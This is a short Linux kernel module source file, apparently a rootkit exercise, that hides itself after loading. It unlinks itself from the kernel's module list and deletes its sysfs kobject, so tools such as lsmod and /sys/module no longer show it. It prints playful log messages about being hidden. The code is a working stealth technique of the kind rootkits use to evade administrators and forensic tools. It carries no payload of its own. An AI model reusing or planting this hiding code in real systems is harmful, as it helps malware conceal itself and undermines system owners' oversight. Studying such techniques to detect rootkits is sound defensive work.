#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IC3");
MODULE_DESCRIPTION("Hiding but also remove from /sys/modules");
MODULE_VERSION("0.4.1");


/* list_head is a doubly-linked list structure used by the kernel
* It's got a .prev and .next field, but we can use the list_del()
* and list_add() functions add/remove items from a list_head struct.
* The only thing to keep in mind is that we need to keep a local copy
* of the item that we remove so we can add it back later when we're done.
*/
static struct list_head *prev_module;
static short hidden = 0;


void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init example_init(void)
{
	printk(KERN_INFO "Hello, from a hidden World!\n");
    hideme();

    /*
    https://manpages.debian.org/testing/linux-manual-4.8/kobject_del.9.en.html
    */
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk(KERN_INFO "Also hidding form /sys/modules :D");
	return 0;
}

static void __exit example_exit(void)
{
	printk(KERN_INFO "Goodbye, hidden World.....\n");
}

module_init(example_init);
module_exit(example_exit);

// https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234